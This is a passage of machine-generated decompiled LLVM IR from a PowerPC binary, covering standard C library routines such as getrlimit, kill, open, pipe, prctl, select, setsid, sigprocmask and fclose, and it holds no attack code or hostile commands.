dec_label_pc_10007ab0.dec_label_pc_10007ac0_crit_edge: ; preds = %dec_label_pc_10007ab0
  br label %dec_label_pc_10007ac0

dec_label_pc_10007ac0:                            ; preds = %dec_label_pc_10007ab0.dec_label_pc_10007ac0_crit_edge, %dec_label_pc_10007aa0
  %v0_10007ad0 = call i32 @__asm_mfcr()
  %v1_10007ad4 = and i32 %v0_10007ad0, 268435456
  %v3_10007ad4 = icmp eq i32 %v1_10007ad4, 0
  store i32 %v0_10007ad0, i32* %r31.global-to-local, align 4
  store i32 %v0_10007ad0, i32* @r4, align 4
  br i1 %v3_10007ad4, label %dec_label_pc_10007af0, label %dec_label_pc_10007ae4

dec_label_pc_10007ae4:                            ; preds = %dec_label_pc_10007ac0
  %v0_10007ae4 = call i32 @__errno_location()
  store i32 -1, i32* @r4, align 4
  %v0_10007aec = load i32, i32* %r31.global-to-local, align 4
  %v2_10007aec = inttoptr i32 %v0_10007ae4 to i32*
  store i32 %v0_10007aec, i32* %v2_10007aec, align 4
  %v0_10007af0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10007af0

dec_label_pc_10007af0:                            ; preds = %dec_label_pc_10007ac0, %dec_label_pc_10007ae4
  %v0_10007af0 = phi i32 [ %v0_10007ad0, %dec_label_pc_10007ac0 ], [ %v0_10007af0.pre, %dec_label_pc_10007ae4 ]
  %v1_10007af0 = icmp slt i32 %v0_10007af0, 0
  %v0_10007af4 = load i32, i32* @r30, align 4
  %v3_10007af4 = icmp eq i32 %v0_10007af4, 0
  br i1 %v1_10007af0, label %dec_label_pc_10007b24, label %dec_label_pc_10007afc

dec_label_pc_10007afc:                            ; preds = %dec_label_pc_10007af0
  br i1 %v3_10007af4, label %dec_label_pc_10007b00, label %dec_label_pc_10007b14.thread8

dec_label_pc_10007b14.thread8:                    ; preds = %dec_label_pc_10007afc
  br label %dec_label_pc_10007b38

dec_label_pc_10007b00:                            ; preds = %dec_label_pc_10007afc
  %v0_10007b00 = load i32, i32* @r28, align 4
  %v3_10007b00 = icmp eq i32 %v0_10007b00, 0
  br i1 %v3_10007b00, label %dec_label_pc_10007b14, label %dec_label_pc_10007b14.thread

dec_label_pc_10007b14.thread:                     ; preds = %dec_label_pc_10007b00
  br label %dec_label_pc_10007b1c

dec_label_pc_10007b14:                            ; preds = %dec_label_pc_10007b00
  %v0_10007b08 = load i32, i32* @r29, align 4
  store i32 268466960, i32* @lr, align 4
  %v1_10007b0c = call i32 @realloc(i32 %v0_10007b08)
  store i32 %v1_10007b0c, i32* @r30, align 4
  %v3_10007b14 = icmp eq i32 %v1_10007b0c, 0
  br i1 %v3_10007b14, label %dec_label_pc_10007b1c, label %dec_label_pc_10007b38

dec_label_pc_10007b1c:                            ; preds = %dec_label_pc_10007b14.thread, %dec_label_pc_10007b14
  %v0_10007b1c = load i32, i32* @r29, align 4
  store i32 %v0_10007b1c, i32* @r30, align 4
  br label %dec_label_pc_10007b38

dec_label_pc_10007b24:                            ; preds = %dec_label_pc_10007af0
  br i1 %v3_10007af4, label %dec_label_pc_10007b28, label %dec_label_pc_10007b34

dec_label_pc_10007b28:                            ; preds = %dec_label_pc_10007b24
  %v0_10007b28 = load i32, i32* @r29, align 4
  store i32 %v0_10007b28, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10007b30.553 to i32), i32* @lr, align 4
  %v0_10007b2c = call i32 @free()
  br label %dec_label_pc_10007b38

dec_label_pc_10007b34:                            ; preds = %dec_label_pc_10007b24, %dec_label_pc_10007ab0
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_10007b38

dec_label_pc_10007b38:                            ; preds = %dec_label_pc_10007b14.thread8, %dec_label_pc_10007b14, %dec_label_pc_10007b28, %dec_label_pc_10007b1c, %dec_label_pc_10007a74, %dec_label_pc_10007b34
  %v0_10007b3c = load i32, i32* @r30, align 4
  ret i32 %v0_10007b3c

; uselistorder directives
  uselistorder i32 %v0_10007ad0, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10007b38, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_10007b1c, { 1, 0 }
  uselistorder label %dec_label_pc_10007af0, { 1, 0 }
  uselistorder label %dec_label_pc_10007ab0, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_10007b5c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268467048, i32* @lr, align 4
  %v2_10007b64 = call i32 @getrlimit(i32 7, i32 %v2_10007b5c)
  %v1_10007b68 = icmp slt i32 %v2_10007b64, 0
  br i1 %v1_10007b68, label %dec_label_pc_10007b78, label %dec_label_pc_10007b74

dec_label_pc_10007b74:                            ; preds = %entry
  %v3_10007b74 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10007b78

dec_label_pc_10007b78:                            ; preds = %entry, %dec_label_pc_10007b74
  %v0_10007b84 = phi i32 [ 256, %entry ], [ %v3_10007b74, %dec_label_pc_10007b74 ]
  ret i32 %v0_10007b84

; uselistorder directives
  uselistorder label %dec_label_pc_10007b78, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_10007b90 = load i32, i32* @global_var_10024a78.554, align 4
  %v3_10007b94 = icmp eq i32 %v3_10007b90, 0
  %v0_10007b98 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10007b94, i32 %v0_10007b98)
  ret i32 %v3_10007b90
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007bbc = call i32 @__asm_mfcr()
  %v1_10007bc0 = and i32 %v0_10007bbc, 268435456
  %v3_10007bc0 = icmp eq i32 %v1_10007bc0, 0
  store i32 %v0_10007bbc, i32* %r31.global-to-local, align 4
  br i1 %v3_10007bc0, label %dec_label_pc_10007bd8, label %dec_label_pc_10007bcc

dec_label_pc_10007bcc:                            ; preds = %entry
  %v0_10007bcc = call i32 @__errno_location()
  %v0_10007bd0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007bd0 = inttoptr i32 %v0_10007bcc to i32*
  store i32 %v0_10007bd0, i32* %v2_10007bd0, align 4
  br label %dec_label_pc_10007bd8

dec_label_pc_10007bd8:                            ; preds = %entry, %dec_label_pc_10007bcc
  %v0_10007be8 = phi i32 [ %v0_10007bbc, %entry ], [ -1, %dec_label_pc_10007bcc ]
  ret i32 %v0_10007be8

; uselistorder directives
  uselistorder label %dec_label_pc_10007bd8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007c04 = call i32 @__asm_mfcr()
  %v1_10007c08 = and i32 %v0_10007c04, 268435456
  %v3_10007c08 = icmp eq i32 %v1_10007c08, 0
  store i32 %v0_10007c04, i32* %r31.global-to-local, align 4
  br i1 %v3_10007c08, label %dec_label_pc_10007c20, label %dec_label_pc_10007c14

dec_label_pc_10007c14:                            ; preds = %entry
  %v0_10007c14 = call i32 @__errno_location()
  %v0_10007c18 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007c18 = inttoptr i32 %v0_10007c14 to i32*
  store i32 %v0_10007c18, i32* %v2_10007c18, align 4
  br label %dec_label_pc_10007c20

dec_label_pc_10007c20:                            ; preds = %entry, %dec_label_pc_10007c14
  %v0_10007c30 = phi i32 [ %v0_10007c04, %entry ], [ -1, %dec_label_pc_10007c14 ]
  ret i32 %v0_10007c30

; uselistorder directives
  uselistorder label %dec_label_pc_10007c20, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007c4c = call i32 @__asm_mfcr()
  %v1_10007c50 = and i32 %v0_10007c4c, 268435456
  %v3_10007c50 = icmp eq i32 %v1_10007c50, 0
  store i32 %v0_10007c4c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007c50, label %dec_label_pc_10007c68, label %dec_label_pc_10007c5c

dec_label_pc_10007c5c:                            ; preds = %entry
  %v0_10007c5c = call i32 @__errno_location()
  %v0_10007c60 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007c60 = inttoptr i32 %v0_10007c5c to i32*
  store i32 %v0_10007c60, i32* %v2_10007c60, align 4
  br label %dec_label_pc_10007c68

dec_label_pc_10007c68:                            ; preds = %entry, %dec_label_pc_10007c5c
  %v0_10007c78 = phi i32 [ %v0_10007c4c, %entry ], [ -1, %dec_label_pc_10007c5c ]
  ret i32 %v0_10007c78

; uselistorder directives
  uselistorder label %dec_label_pc_10007c68, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_10007c90 = and i32 %arg2, 64
  %v3_10007c90 = icmp eq i32 %v1_10007c90, 0
  br i1 %v3_10007c90, label %dec_label_pc_10007cbc, label %dec_label_pc_10007ca0

dec_label_pc_10007ca0:                            ; preds = %entry
  %v2_10007ca8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007ca8, i32* %stack_var_-32, align 4
  %v0_10007cb8 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10007cbc

dec_label_pc_10007cbc:                            ; preds = %entry, %dec_label_pc_10007ca0
  %v0_10007cbc = phi i32 [ 0, %entry ], [ %v0_10007cb8, %dec_label_pc_10007ca0 ]
  store i32 %v0_10007cbc, i32* @r5, align 4
  %v0_10007cc4 = call i32 @__asm_mfcr()
  %v1_10007cc8 = and i32 %v0_10007cc4, 268435456
  %v3_10007cc8 = icmp eq i32 %v1_10007cc8, 0
  store i32 %v0_10007cc4, i32* %r31.global-to-local, align 4
  br i1 %v3_10007cc8, label %dec_label_pc_10007ce0, label %dec_label_pc_10007cd4

dec_label_pc_10007cd4:                            ; preds = %dec_label_pc_10007cbc
  %v0_10007cd4 = call i32 @__errno_location()
  %v0_10007cd8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007cd8 = inttoptr i32 %v0_10007cd4 to i32*
  store i32 %v0_10007cd8, i32* %v2_10007cd8, align 4
  br label %dec_label_pc_10007ce0

dec_label_pc_10007ce0:                            ; preds = %dec_label_pc_10007cbc, %dec_label_pc_10007cd4
  %v0_10007cf0 = phi i32 [ %v0_10007cc4, %dec_label_pc_10007cbc ], [ -1, %dec_label_pc_10007cd4 ]
  ret i32 %v0_10007cf0

; uselistorder directives
  uselistorder label %dec_label_pc_10007ce0, { 1, 0 }
  uselistorder label %dec_label_pc_10007cbc, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  %v2_10007d00 = call i32 @__libc_open(i32 577, i32 577)
  ret i32 %v2_10007d00
}

define i32 @__GI_pipe(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007d1c = call i32 @__asm_mfcr()
  %v1_10007d20 = and i32 %v0_10007d1c, 268435456
  %v3_10007d20 = icmp eq i32 %v1_10007d20, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10007d1c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007d20, label %dec_label_pc_10007d38, label %dec_label_pc_10007d2c

dec_label_pc_10007d2c:                            ; preds = %entry
  %v0_10007d2c = call i32 @__errno_location()
  %v0_10007d30 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007d30 = inttoptr i32 %v0_10007d2c to i32*
  store i32 %v0_10007d30, i32* %v2_10007d30, align 4
  br label %dec_label_pc_10007d38

dec_label_pc_10007d38:                            ; preds = %entry, %dec_label_pc_10007d2c
  %v0_10007d48 = phi i32 [ %v0_10007d1c, %entry ], [ -1, %dec_label_pc_10007d2c ]
  ret i32 %v0_10007d48

; uselistorder directives
  uselistorder label %dec_label_pc_10007d38, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007d64 = call i32 @__asm_mfcr()
  %v1_10007d68 = and i32 %v0_10007d64, 268435456
  %v3_10007d68 = icmp eq i32 %v1_10007d68, 0
  store i32 %v0_10007d64, i32* %r31.global-to-local, align 4
  br i1 %v3_10007d68, label %dec_label_pc_10007d80, label %dec_label_pc_10007d74

dec_label_pc_10007d74:                            ; preds = %entry
  %v0_10007d74 = call i32 @__errno_location()
  %v0_10007d78 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007d78 = inttoptr i32 %v0_10007d74 to i32*
  store i32 %v0_10007d78, i32* %v2_10007d78, align 4
  br label %dec_label_pc_10007d80

dec_label_pc_10007d80:                            ; preds = %entry, %dec_label_pc_10007d74
  %v0_10007d90 = phi i32 [ %v0_10007d64, %entry ], [ -1, %dec_label_pc_10007d74 ]
  ret i32 %v0_10007d90

; uselistorder directives
  uselistorder label %dec_label_pc_10007d80, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007dac = call i32 @__asm_mfcr()
  %v1_10007db0 = and i32 %v0_10007dac, 268435456
  %v3_10007db0 = icmp eq i32 %v1_10007db0, 0
  store i32 %v0_10007dac, i32* %r31.global-to-local, align 4
  br i1 %v3_10007db0, label %dec_label_pc_10007dc8, label %dec_label_pc_10007dbc

dec_label_pc_10007dbc:                            ; preds = %entry
  %v0_10007dbc = call i32 @__errno_location()
  %v0_10007dc0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007dc0 = inttoptr i32 %v0_10007dbc to i32*
  store i32 %v0_10007dc0, i32* %v2_10007dc0, align 4
  br label %dec_label_pc_10007dc8

dec_label_pc_10007dc8:                            ; preds = %entry, %dec_label_pc_10007dbc
  %v0_10007dd8 = phi i32 [ %v0_10007dac, %entry ], [ -1, %dec_label_pc_10007dbc ]
  ret i32 %v0_10007dd8

; uselistorder directives
  uselistorder label %dec_label_pc_10007dc8, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007df4 = call i32 @__asm_mfcr()
  %v1_10007df8 = and i32 %v0_10007df4, 268435456
  %v3_10007df8 = icmp eq i32 %v1_10007df8, 0
  store i32 %v0_10007df4, i32* %r31.global-to-local, align 4
  br i1 %v3_10007df8, label %dec_label_pc_10007e10, label %dec_label_pc_10007e04

dec_label_pc_10007e04:                            ; preds = %entry
  %v0_10007e04 = call i32 @__errno_location()
  %v0_10007e08 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007e08 = inttoptr i32 %v0_10007e04 to i32*
  store i32 %v0_10007e08, i32* %v2_10007e08, align 4
  br label %dec_label_pc_10007e10

dec_label_pc_10007e10:                            ; preds = %entry, %dec_label_pc_10007e04
  %v0_10007e20 = phi i32 [ %v0_10007df4, %entry ], [ -1, %dec_label_pc_10007e04 ]
  ret i32 %v0_10007e20

; uselistorder directives
  uselistorder label %dec_label_pc_10007e10, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007e3c = call i32 @__asm_mfcr()
  %v1_10007e40 = and i32 %v0_10007e3c, 268435456
  %v3_10007e40 = icmp eq i32 %v1_10007e40, 0
  store i32 %v0_10007e3c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007e40, label %dec_label_pc_10007e58, label %dec_label_pc_10007e4c

dec_label_pc_10007e4c:                            ; preds = %entry
  %v0_10007e4c = call i32 @__errno_location()
  %v0_10007e50 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007e50 = inttoptr i32 %v0_10007e4c to i32*
  store i32 %v0_10007e50, i32* %v2_10007e50, align 4
  br label %dec_label_pc_10007e58

dec_label_pc_10007e58:                            ; preds = %entry, %dec_label_pc_10007e4c
  %v0_10007e68 = phi i32 [ %v0_10007e3c, %entry ], [ -1, %dec_label_pc_10007e4c ]
  ret i32 %v0_10007e68

; uselistorder directives
  uselistorder label %dec_label_pc_10007e58, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_10007e6c = icmp eq i32 %arg2, 0
  br i1 %v3_10007e6c, label %dec_label_pc_10007eac, label %dec_label_pc_10007e94

dec_label_pc_10007e94:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_10007eac, label %dec_label_pc_10007e9c

dec_label_pc_10007e9c:                            ; preds = %dec_label_pc_10007e94
  %v0_10007e9c = call i32 @__errno_location()
  %v2_10007ea4 = inttoptr i32 %v0_10007e9c to i32*
  store i32 22, i32* %v2_10007ea4, align 4
  %v0_10007ed0.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007ecc

dec_label_pc_10007eac:                            ; preds = %dec_label_pc_10007e94, %entry
  %v0_10007eb0 = call i32 @__asm_mfcr()
  %v1_10007eb4 = and i32 %v0_10007eb0, 268435456
  %v3_10007eb4 = icmp eq i32 %v1_10007eb4, 0
  store i32 %v0_10007eb0, i32* %r31.global-to-local, align 4
  br i1 %v3_10007eb4, label %dec_label_pc_10007ecc, label %dec_label_pc_10007ec0

dec_label_pc_10007ec0:                            ; preds = %dec_label_pc_10007eac
  %v0_10007ec0 = call i32 @__errno_location()
  %v0_10007ec4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007ec4 = inttoptr i32 %v0_10007ec0 to i32*
  store i32 %v0_10007ec4, i32* %v2_10007ec4, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007ecc

dec_label_pc_10007ecc:                            ; preds = %dec_label_pc_10007eac, %dec_label_pc_10007e9c, %dec_label_pc_10007ec0
  %v0_10007ed0 = phi i32 [ %v0_10007eb0, %dec_label_pc_10007eac ], [ %v0_10007ed0.pre, %dec_label_pc_10007e9c ], [ -1, %dec_label_pc_10007ec0 ]
  ret i32 %v0_10007ed0

; uselistorder directives
  uselistorder label %dec_label_pc_10007ecc, { 2, 0, 1 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007efc = call i32 @__asm_mfcr()
  %v1_10007f00 = and i32 %v0_10007efc, 268435456
  %v3_10007f00 = icmp eq i32 %v1_10007f00, 0
  store i32 %v0_10007efc, i32* %r31.global-to-local, align 4
  br i1 %v3_10007f00, label %dec_label_pc_10007f18, label %dec_label_pc_10007f0c

dec_label_pc_10007f0c:                            ; preds = %entry
  %v0_10007f0c = call i32 @__errno_location()
  %v0_10007f10 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007f10 = inttoptr i32 %v0_10007f0c to i32*
  store i32 %v0_10007f10, i32* %v2_10007f10, align 4
  br label %dec_label_pc_10007f18

dec_label_pc_10007f18:                            ; preds = %entry, %dec_label_pc_10007f0c
  %v0_10007f28 = phi i32 [ %v0_10007efc, %entry ], [ -1, %dec_label_pc_10007f0c ]
  ret i32 %v0_10007f28

; uselistorder directives
  uselistorder label %dec_label_pc_10007f18, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10007f30 = call i32 @wait4(i32 0)
  ret i32 %v1_10007f30
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10007f4c = call i32 @__asm_mfcr()
  %v1_10007f50 = and i32 %v0_10007f4c, 268435456
  %v3_10007f50 = icmp eq i32 %v1_10007f50, 0
  store i32 %v0_10007f4c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007f50, label %dec_label_pc_10007f68, label %dec_label_pc_10007f5c

dec_label_pc_10007f5c:                            ; preds = %entry
  %v0_10007f5c = call i32 @__errno_location()
  %v0_10007f60 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007f60 = inttoptr i32 %v0_10007f5c to i32*
  store i32 %v0_10007f60, i32* %v2_10007f60, align 4
  br label %dec_label_pc_10007f68

dec_label_pc_10007f68:                            ; preds = %entry, %dec_label_pc_10007f5c
  %v0_10007f78 = phi i32 [ %v0_10007f4c, %entry ], [ -1, %dec_label_pc_10007f5c ]
  ret i32 %v0_10007f78

; uselistorder directives
  uselistorder label %dec_label_pc_10007f68, { 1, 0 }
}

define i32 @isspace(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10007f80 = mul i32 %arg1, 2
  %v3_10007f84 = load i32, i32* inttoptr (i32 268585456 to i32*), align 16
  %v2_10007f88 = add i32 %v3_10007f84, %v1_10007f80
  %v3_10007f88 = inttoptr i32 %v2_10007f88 to i16*
  %v4_10007f88 = load i16, i16* %v3_10007f88, align 2
  %v5_10007f88 = zext i16 %v4_10007f88 to i32
  %v1_10007f8c = call i32 @__asm_rlwinm(i32 %v5_10007f88, i32 0, i32 26, i32 26)
  ret i32 %v1_10007f8c
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10007f94 = add i32 %arg1, 128
  %v1_10007f98 = mul i32 %arg1, 2
  %v2_10007f9c = icmp ugt i32 %v1_10007f94, 383
  %v0_10007fa0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10007f9c, i32 %v0_10007fa0)
  %v3_10007fa8 = load i32, i32* inttoptr (i32 268585464 to i32*), align 8
  %v2_10007fac = add i32 %v1_10007f98, %v3_10007fa8
  %v3_10007fac = inttoptr i32 %v2_10007fac to i16*
  %v4_10007fac = load i16, i16* %v3_10007fac, align 2
  %v5_10007fac = sext i16 %v4_10007fac to i32
  ret i32 %v5_10007fac
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10024a88.561 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10007fd4 = add i32 %tmp, 52
  %v3_10007fd4 = inttoptr i32 %v2_10007fd4 to i32*
  %v4_10007fd4 = load i32, i32* %v3_10007fd4, align 4
  store i32 %v4_10007fd4, i32* @r28, align 4
  %v3_10007fd8 = icmp eq i32 %v4_10007fd4, 0
  store i1 %v3_10007fd8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007fd8, label %dec_label_pc_10007fe0, label %dec_label_pc_10008000

dec_label_pc_10007fe0:                            ; preds = %entry
  %v2_10007fe8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10007fe8, i32* @r3, align 4
  %v0_10007ff4 = call i32 @__pthread_return_void()
  %v0_10007ffc = call i32 @__pthread_return_0()
  %v0_10008000.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008000

dec_label_pc_10008000:                            ; preds = %entry, %dec_label_pc_10007fe0
  %v0_10008010 = phi i32 [ %tmp, %entry ], [ %v0_10008000.pre, %dec_label_pc_10007fe0 ]
  %v1_10008000 = inttoptr i32 %v0_10008010 to i16*
  %v2_10008000 = load i16, i16* %v1_10008000, align 2
  %v3_10008000 = zext i16 %v2_10008000 to i32
  store i32 0, i32* @r27, align 4
  %v1_10008008 = and i32 %v3_10008000, 64
  %v3_10008008 = icmp eq i32 %v1_10008008, 0
  br i1 %v3_10008008, label %dec_label_pc_1000801c, label %dec_label_pc_10008010

dec_label_pc_10008010:                            ; preds = %dec_label_pc_10008000
  store i32 268468248, i32* @lr, align 4
  %v4_10008014 = call i32 @fflush_unlocked(i16* %v1_10008000, i32 %v1_10008008)
  store i32 %v4_10008014, i32* @r27, align 4
  %v0_1000801c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000801c

dec_label_pc_1000801c:                            ; preds = %dec_label_pc_10008000, %dec_label_pc_10008010
  %v0_1000801c = phi i32 [ %v0_10008010, %dec_label_pc_10008000 ], [ %v0_1000801c.pre, %dec_label_pc_10008010 ]
  %v1_1000801c = add i32 %v0_1000801c, 4
  %v2_1000801c = inttoptr i32 %v1_1000801c to i32*
  %v3_1000801c = load i32, i32* %v2_1000801c, align 4
  store i32 268468260, i32* @lr, align 4
  %v1_10008020 = call i32 @__libc_close(i32 %v3_1000801c)
  %v3_10008024 = icmp eq i32 %v1_10008020, 0
  store i1 %v3_10008024, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10008020, -1
  br i1 %tmp8, label %dec_label_pc_10008030, label %dec_label_pc_1000802c

dec_label_pc_1000802c:                            ; preds = %dec_label_pc_1000801c
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10008030

dec_label_pc_10008030:                            ; preds = %dec_label_pc_1000801c, %dec_label_pc_1000802c
  store i32 ptrtoint ([3 x i8]* @global_var_1000c114.562 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_100246cc.563 to i32), i32* @r29, align 4
  %v1_10008044 = load i32, i32* @r31, align 4
  %v2_10008044 = add i32 %v1_10008044, 4
  %v3_10008044 = inttoptr i32 %v2_10008044 to i32*
  store i32 -1, i32* %v3_10008044, align 4
  %v2_10008048 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10008048, i32* @r30, align 4
  store i32 %v2_10008048, i32* @r3, align 4
  %v0_10008058 = call i32 @__pthread_return_void()
  %v0_10008060 = call i32 @__pthread_return_0()
  %v3_10008068 = load i32, i32* @global_var_10024a60.564, align 4
  store i32 %v2_10008048, i32* @r3, align 4
  %v1_10008074 = add i32 %v3_10008068, 1
  store i32 %v1_10008074, i32* @global_var_10024a60.564, align 4
  %v0_1000807c = call i32 @__pthread_return_void()
  %v0_10008080 = load i32, i32* @r31, align 4
  %v1_10008080 = inttoptr i32 %v0_10008080 to i16*
  %v2_10008080 = load i16, i16* %v1_10008080, align 2
  %v3_10008080 = zext i16 %v2_10008080 to i32
  %v0_10008084 = load i32, i32* @r28, align 4
  %v3_10008084 = icmp eq i32 %v0_10008084, 0
  store i1 %v3_10008084, i1* %cr7_eq.global-to-local, align 1
  %v1_10008088 = call i32 @__asm_rlwinm(i32 %v3_10008080, i32 0, i32 17, i32 18)
  %v1_10008090 = or i32 %v1_10008088, 48
  %v1_10008094 = trunc i32 %v1_10008090 to i16
  %v2_10008094 = load i32, i32* @r31, align 4
  %v3_10008094 = inttoptr i32 %v2_10008094 to i16*
  store i16 %v1_10008094, i16* %v3_10008094, align 2
  %v0_10008098 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10008098, label %dec_label_pc_1000809c, label %dec_label_pc_100080a8

dec_label_pc_1000809c:                            ; preds = %dec_label_pc_10008030
  %v2_1000809c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000809c, i32* @r3, align 4
  %v0_100080a4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_100080a8

dec_label_pc_100080a8:                            ; preds = %dec_label_pc_10008030, %dec_label_pc_1000809c
  %v0_100080a8 = load i32, i32* @r31, align 4
  %v1_100080a8 = inttoptr i32 %v0_100080a8 to i16*
  %v2_100080a8 = load i16, i16* %v1_100080a8, align 2
  %v1_100080ac = and i16 %v2_100080a8, 16384
  %v3_100080ac = icmp eq i16 %v1_100080ac, 0
  br i1 %v3_100080ac, label %dec_label_pc_100080bc, label %dec_label_pc_100080b4

dec_label_pc_100080b4:                            ; preds = %dec_label_pc_100080a8
  %v1_100080b4 = add i32 %v0_100080a8, 8
  %v2_100080b4 = inttoptr i32 %v1_100080b4 to i32*
  %v3_100080b4 = load i32, i32* %v2_100080b4, align 4
  store i32 %v3_100080b4, i32* @r3, align 4
  store i32 268468412, i32* @lr, align 4
  %v0_100080b8 = call i32 @free()
  br label %dec_label_pc_100080bc

dec_label_pc_100080bc:                            ; preds = %dec_label_pc_100080a8, %dec_label_pc_100080b4
  store i32 %v2_10008048, i32* @r3, align 4
  %v0_100080c8 = call i32 @__pthread_return_void()
  %v0_100080d0 = call i32 @__pthread_return_0()
  %v3_100080d8 = load i32, i32* @global_var_10024a64.565, align 4
  store i32 %v2_10008048, i32* @r3, align 4
  %v1_100080e4 = add i32 %v3_100080d8, 1
  store i32 %v1_100080e4, i32* @global_var_10024a64.565, align 4
  %v0_100080ec = call i32 @__pthread_return_void()
  store i32 268468468, i32* @lr, align 4
  %v0_100080f0 = call i32 @_stdio_openlist_dec_use()
  %v0_100080f8 = load i32, i32* @r27, align 4
  ret i32 %v0_100080f8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100080bc, { 1, 0 }
  uselistorder label %dec_label_pc_100080a8, { 1, 0 }
  uselistorder label %dec_label_pc_10008030, { 1, 0 }
  uselistorder label %dec_label_pc_1000801c, { 1, 0 }
  uselistorder label %dec_label_pc_10008000, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10008114 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10008114
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  store i32 %arg5, i32* @r8, align 4
